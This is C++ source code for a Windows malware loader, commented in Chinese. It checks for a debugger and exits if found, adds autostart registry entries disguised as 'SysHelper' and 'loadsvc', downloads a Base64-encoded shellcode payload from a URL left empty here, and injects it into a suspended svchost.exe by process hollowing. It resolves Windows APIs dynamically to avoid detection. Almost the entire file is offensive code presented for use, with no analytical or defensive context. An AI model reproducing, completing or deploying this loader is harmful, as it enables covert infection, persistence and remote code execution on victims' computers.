#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <random>

// 混淆宏定义
#define XOR_KEY 0x7F
#define STR_XOR(str) do { for (size_t i = 0; str[i]; i++) str[i] ^= XOR_KEY; } while(0)
#define STR_UNXOR(str) STR_XOR(str)

// 动态API解析宏
#define LOAD_API(lib, func) reinterpret_cast<decltype(&func)>(GetProcAddress(GetModuleHandleA(lib) ? GetModuleHandleA(lib) : LoadLibraryA(lib), #func))

// Base64解码函数
std::vector<unsigned char> DecodeBase64(const std::string& x) {
    const char* b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<unsigned char> r;
    DWORD v = 0;
    int vb = -8;
    for (char c : x) {
        size_t p = 0; while (b[p] && b[p] != c) p++;
        if (!b[p]) continue;
        v = (v << 6) + static_cast<DWORD>(p);
        vb += 6;
        if (vb >= 0) {
            r.push_back((v >> vb) & 0xFF);
            vb -= 8;
        }
    }
    return r;
}

// 动态加载Shellcode
std::vector<unsigned char> FetchPayload() {
    auto iOpen = LOAD_API("wininet.dll", InternetOpenA);
    auto iOpenUrl = LOAD_API("wininet.dll", InternetOpenUrlA);
    auto iRead = LOAD_API("wininet.dll", InternetReadFile);
    auto iClose = LOAD_API("wininet.dll", InternetCloseHandle);

    if (!iOpen || !iOpenUrl || !iRead || !iClose) return {};

    char ua[] = "Mozilla/5.0"; STR_XOR(ua); STR_UNXOR(ua);
    HINTERNET hInt = iOpen(ua, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return {};

    char url[] = "";
    STR_XOR(url); STR_UNXOR(url);
    HINTERNET hUrl = iOpenUrl(hInt, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) { iClose(hInt); return {}; }

    std::string d;
    char buf[1024];
    DWORD br;
    while (iRead(hUrl, buf, sizeof(buf), &br) && br > 0) {
        d.append(buf, br);
    }

    iClose(hUrl);
    iClose(hInt);
    return DecodeBase64(d);
}

// 反调试检测
bool IsDebugged() {
    auto checkDbg = LOAD_API("kernel32.dll", IsDebuggerPresent);
    auto checkRemoteDbg = LOAD_API("kernel32.dll", CheckRemoteDebuggerPresent);
    if (!checkDbg || !checkRemoteDbg) return false;

    BOOL remoteDbg = FALSE;
    checkRemoteDbg(GetCurrentProcess(), &remoteDbg);
    return checkDbg() || remoteDbg;
}

// 注入傀儡进程
void RunInPuppet(const std::vector<unsigned char>& sc) {
    auto cProc = LOAD_API("kernel32.dll", CreateProcessA);
    auto vAlloc = LOAD_API("kernel32.dll", VirtualAllocEx);
    auto wMem = LOAD_API("kernel32.dll", WriteProcessMemory);
    auto gCtx = LOAD_API("kernel32.dll", GetThreadContext);
    auto sCtx = LOAD_API("kernel32.dll", SetThreadContext);
    auto rThread = LOAD_API("kernel32.dll", ResumeThread);
    auto tProc = LOAD_API("kernel32.dll", TerminateProcess);

    if (!cProc || !vAlloc || !wMem || !gCtx || !sCtx || !rThread || !tProc) return;

    char path[] = "C:\\Windows\\System32\\svchost.exe";
    STR_XOR(path); STR_UNXOR(path);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!cProc(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return;

    CONTEXT ctx = { CONTEXT_FULL };
    if (!gCtx(pi.hThread, &ctx)) {
        if (pi.hProcess) tProc(pi.hProcess, 1);
        if (pi.hThread) CloseHandle(pi.hThread);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        return;
    }

    LPVOID mem = vAlloc(pi.hProcess, NULL, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        if (pi.hProcess) tProc(pi.hProcess, 1);
        if (pi.hThread) CloseHandle(pi.hThread);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        return;
    }

    wMem(pi.hProcess, mem, sc.data(), sc.size(), NULL);
#ifdef _M_IX86
    ctx.Eip = reinterpret_cast<DWORD>(mem); // 32位
#else
    ctx.Rip = reinterpret_cast<DWORD_PTR>(mem); // 64位
#endif
    sCtx(pi.hThread, &ctx);
    rThread(pi.hThread);

    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
}

// 多重注册表自启
void Persist() {
    auto rOpen = LOAD_API("advapi32.dll", RegOpenKeyExA);
    auto rSet = LOAD_API("advapi32.dll", RegSetValueExA);
    auto rClose = LOAD_API("advapi32.dll", RegCloseKey);

    if (!rOpen || !rSet || !rClose) return;

    HKEY hKey;
    char p1[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char p2[] = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
    char n1[] = "SysHelper";
    char n2[] = "loadsvc";
    char exe[MAX_PATH];
    GetModuleFileNameA(NULL, exe, MAX_PATH);

    STR_XOR(p1); STR_XOR(p2); STR_XOR(n1); STR_XOR(n2); STR_XOR(exe);
    STR_UNXOR(p1); STR_UNXOR(p2); STR_UNXOR(n1); STR_UNXOR(n2); STR_UNXOR(exe);

    if (rOpen(HKEY_CURRENT_USER, p1, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        rSet(hKey, n1, 0, REG_SZ, (BYTE*)exe, strlen(exe) + 1);
        rClose(hKey);
    }
    if (rOpen(HKEY_LOCAL_MACHINE, p2, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        rSet(hKey, n2, 0, REG_SZ, (BYTE*)exe, strlen(exe) + 1);
        rClose(hKey);
    }
}

// 使用APIENTRY的WinMain入口
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (IsDebugged()) {
        ExitProcess(0);
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<DWORD> dis(2000, 8000);
    Sleep(dis(gen));

    Persist();
    auto sc = FetchPayload();
    if (!sc.empty()) {
        RunInPuppet(sc);
    }

    return 0;
}